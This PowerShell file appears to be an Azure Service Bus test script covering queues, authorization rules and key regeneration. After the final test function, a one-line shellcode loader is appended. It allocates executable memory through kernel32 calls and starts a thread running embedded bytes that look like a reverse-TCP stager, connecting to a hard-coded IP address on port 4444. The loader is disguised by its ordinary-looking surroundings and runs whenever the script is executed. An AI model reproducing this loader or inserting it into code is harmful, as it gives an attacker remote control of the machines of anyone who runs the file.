














function ServiceBusQueueTests {
    
    $location = Get-Location
    $resourceGroupName = getAssetName "RGName-"
    $namespaceName = getAssetName "Namespace-"
    $nameQueue = getAssetName "Queue-"
    
    Write-Debug "ResourceGroup name : $resourceGroupName"
    New-AzResourceGroup -Name $resourceGroupName -Location $location -Force
    
    Write-Debug " Create new Queue Namespace: $namespaceName"
    $result = New-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Location $location -Name $namespaceName
    
    Write-Debug "Get the created namespace within the resource group"
    $createdNamespace = Get-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName
	    
    Assert-AreEqual $createdNamespace.Name $namespaceName "Created Namespace not found"
	
    $test = Test-AzServiceBusNameAvailability -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $nameQueue -Queue
    Assert-True { $test }
	
    Write-Debug "Create Queue"	
    $result = New-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $nameQueue
    Assert-AreEqual $result.Name $nameQueue "In CreateQueue response Name not found"
	
    $test = Test-AzServiceBusNameAvailability -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $nameQueue -Queue
    Assert-False { $test }

    $resultGetQueue = Get-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $result.Name
    Assert-AreEqual $resultGetQueue.Name $result.Name "In GetQueue response, QueueName not found"
	
    $resultGetQueue.EnableExpress = $True
    $resultGetQueue.DeadLetteringOnMessageExpiration = $True
    $resultGetQueue.MaxDeliveryCount = 5
    $resultGetQueue.MaxSizeInMegabytes = 1024
    $resultGetQueue.EnableBatchedOperations = $True

    $resltSetQueue = Set-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $resultGetQueue.Name -InputObject $resultGetQueue
    Assert-AreEqual $resltSetQueue.Name $resultGetQueue.Name "In GetQueue response, QueueName not found"

    
    $ResulListQueue = Get-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName
    Assert-True { $ResulListQueue.Count -gt 0 } "no queues were found in ListQueue"

    
    $ResultDeleteQueue = Remove-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $ResulListQueue[0].Name -PassThru
    Assert-True { $ResultDeleteQueue } "Queue not deleted"

    
    
    Write-Debug " Delete the Queue"
    for ($i = 0; $i -lt $ResulListQueue.Count; $i++) {
        $delete1 = Remove-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $ResulListQueue[$i].Name		
    }

    Write-Debug " Delete namespaces"
    Remove-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName

    Write-Debug " Delete resourcegroup"
    Remove-AzResourceGroup -Name $resourceGroupName -Force
}



function ServiceBusQueueAuthTests {
    
    $location = Get-Location
    $resourceGroupName = getAssetName "RGName-"
    $namespaceName = getAssetName "Namespace-"
    $queueName = getAssetName "Queue-"
    $authRuleName = getAssetName "authorule-"
    $authRuleNameListen = getAssetName "authorule-"
    $authRuleNameSend = getAssetName "authorule-"
    $authRuleNameAll = getAssetName "authorule-"

    
    Write-Debug " Create resource group"    
    Write-Debug "Resource group name : $resourceGroupName"
    New-AzResourceGroup -Name $resourceGroupName -Location $location -Force
	   
    
    Write-Debug " Create new ServiceBus namespace"
    Write-Debug "Namespace name : $namespaceName"
    $result = New-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Location $location -Name $namespaceName   
    
    
    Assert-AreEqual $result.ProvisioningState "Succeeded"

    
    Write-Debug " Get the created namespace within the resource group"
    $createdNamespace = Get-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName
    
    
    Assert-AreEqual $createdNamespace.Name $namespaceName "Created Namespace not found"

    
    Write-Debug " Create new Queue "    
    $msgRetentionInDays = 3
    $partionCount = 2
    $result_Queue = New-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $queueName -EnablePartitioning $TRUE

    Assert-AreEqual $result_Queue.Name $queueName "Created Queue not found"

	
    Write-Debug "Get the created Queue"
    $getQueue = Get-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $result_Queue.Name

    
    Assert-AreEqual $getQueue.Name $queueName "Get-Queue, created queue not found"

    
    Write-Debug "Create a Queue Authorization Rule"
    $result = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName -Rights @("Listen", "Send")

    
    Assert-AreEqual $authRuleName $result.Name
    Assert-AreEqual 2 $result.Rights.Count
    Assert-True { $result.Rights -Contains "Listen" }
    Assert-True { $result.Rights -Contains "Send" }
    
    $resultListen = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleNameListen -Rights @("Listen")
    Assert-AreEqual $authRuleNameListen $resultListen.Name
    Assert-AreEqual 1 $resultListen.Rights.Count
    Assert-True { $resultListen.Rights -Contains "Listen" }

    $resultSend = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleNameSend -Rights @("Send")
    Assert-AreEqual $authRuleNameSend $resultSend.Name
    Assert-AreEqual 1 $resultSend.Rights.Count
    Assert-True { $resultSend.Rights -Contains "Send" }

    $resultAll3 = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleNameAll -Rights @("Listen", "Send", "Manage")
    Assert-AreEqual $authRuleNameAll $resultAll3.Name
    Assert-AreEqual 3 $resultAll3.Rights.Count
    Assert-True { $resultAll3.Rights -Contains "Send" }
    Assert-True { $resultAll3.Rights -Contains "Listen" }
    Assert-True { $resultAll3.Rights -Contains "Manage" }

    
    Write-Debug "Get created authorizationRule"
    $createdAuthRule = Get-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName

    
    Assert-AreEqual $authRuleName $createdAuthRule.Name
    Assert-AreEqual 2 $createdAuthRule.Rights.Count
    Assert-True { $createdAuthRule.Rights -Contains "Listen" }	
    Assert-True { $createdAuthRule.Rights -Contains "Send" }

    
    Write-Debug "Get All Queue AuthorizationRule"
    $result = Get-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName
    
    Assert-True { $result.Count -ge 2 }
    
    
    Write-Debug "Update Queue AuthorizationRule"
    $createdAuthRule.Rights.Add("Manage")
    $updatedAuthRule = Set-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName -InputObject $createdAuthRule
    
    
    Assert-AreEqual $authRuleName $updatedAuthRule.Name "Queue AuthorizationRule created earlier is not found."
    Assert-AreEqual 3 $updatedAuthRule.Rights.Count
    Assert-True { $updatedAuthRule.Rights -Contains "Listen" }
    Assert-True { $updatedAuthRule.Rights -Contains "Send" }
    Assert-True { $updatedAuthRule.Rights -Contains "Manage" }
	   
    
    $updatedAuthRule = Get-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName
    
    
    Assert-AreEqual $authRuleName $updatedAuthRule.Name
    Assert-AreEqual 3 $updatedAuthRule.Rights.Count
    Assert-True { $updatedAuthRule.Rights -Contains "Listen" }
    Assert-True { $updatedAuthRule.Rights -Contains "Send" }
    Assert-True { $updatedAuthRule.Rights -Contains "Manage" }
	
    
    Write-Debug "Get Queue authorizationRules connectionStrings"
    $namespaceListKeys = Get-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName

    Assert-True { $namespaceListKeys.PrimaryConnectionString -like "*$($updatedAuthRule.PrimaryKey)*" }
    Assert-True { $namespaceListKeys.SecondaryConnectionString -like "*$($updatedAuthRule.SecondaryKey)*" }
	
    
    $policyKey = "PrimaryKey"

    $StartTime = Get-Date
    $EndTime = $StartTime.AddHours(2.0)
    $SasToken = New-AzServiceBusAuthorizationRuleSASToken -ResourceId $updatedAuthRule.Id  -KeyType Primary -ExpiryTime $EndTime -StartTime $StartTime

    $namespaceRegenerateKeysDefault = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName -RegenerateKey $policyKey
    Assert-True { $namespaceRegenerateKeysDefault.PrimaryKey -ne $namespaceListKeys.PrimaryKey }

    $namespaceRegenerateKeys = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName -RegenerateKey $policyKey -KeyValue $namespaceListKeys.PrimaryKey
    Assert-AreEqual $namespaceRegenerateKeys.PrimaryKey $namespaceListKeys.PrimaryKey

    $policyKey1 = "SecondaryKey"

    $namespaceRegenerateKeys1 = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName -RegenerateKey $policyKey1 -KeyValue $namespaceListKeys.PrimaryKey
    Assert-AreEqual $namespaceRegenerateKeys1.SecondaryKey $namespaceListKeys.PrimaryKey

    $namespaceRegenerateKeys1 = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName -RegenerateKey $policyKey1
    Assert-True { $namespaceRegenerateKeys1.SecondaryKey -ne $namespaceListKeys.PrimaryKey }
    Assert-True { $namespaceRegenerateKeys1.SecondaryKey -ne $namespaceListKeys.SecondaryKey }
	
    
    Write-Debug "Delete the created Queue AuthorizationRule"
    $result = Remove-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Queue $queueName -Name $authRuleName -Force
    
    
    
    
    Write-Debug " Delete the Queue"

    Write-Debug "Get the created Queues"
    $createdQueues = Get-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName 
    for ($i = 0; $i -lt $createdQueues.Count; $i++) {
        $delete1 = Remove-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $createdQueues[$i].Name		
    }
    

    Write-Debug "Delete NameSpace"
    $createdNamespaces = Get-AzServiceBusNamespace -ResourceGroupName $resourceGroupName
    for ($i = 0; $i -lt $createdNamespaces.Count; $i++) {
        Remove-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $createdNamespaces[$i].Name
    }

    Write-Debug " Delete resourcegroup"
    Remove-AzResourceGroup -Name $resourceGroupName -Force
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4d,0xad,0x8c,0x6e,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

